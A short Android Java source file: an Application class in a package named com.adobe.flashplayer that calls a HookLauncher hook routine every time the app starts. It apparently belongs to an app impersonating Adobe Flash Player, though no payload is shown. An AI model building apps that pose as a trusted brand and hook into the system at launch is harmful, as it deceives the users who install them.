package com.adobe.flashplayer;

import android.app.Application;
import android.content.Context;
import android.util.Log;

import com.adobe.flashplayer.accessory.HookLauncher;
import com.adobe.flashplayer.install.InstallActivity;


public class MyApplication  extends Application{

    private String TAG = "[ljg]MyApplication ";

    public static Context mInstance;

    public static Context getInstance() {
        return mInstance;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        mInstance = this;

        Public pub = new Public(getApplicationContext());

        HookLauncher.hookHandler(mInstance);

        Log.e(TAG,"onCreate");

    }

    @Override
    public void onTerminate(){
        super.onTerminate();
        Log.e(TAG, "onTerminate");
    }

}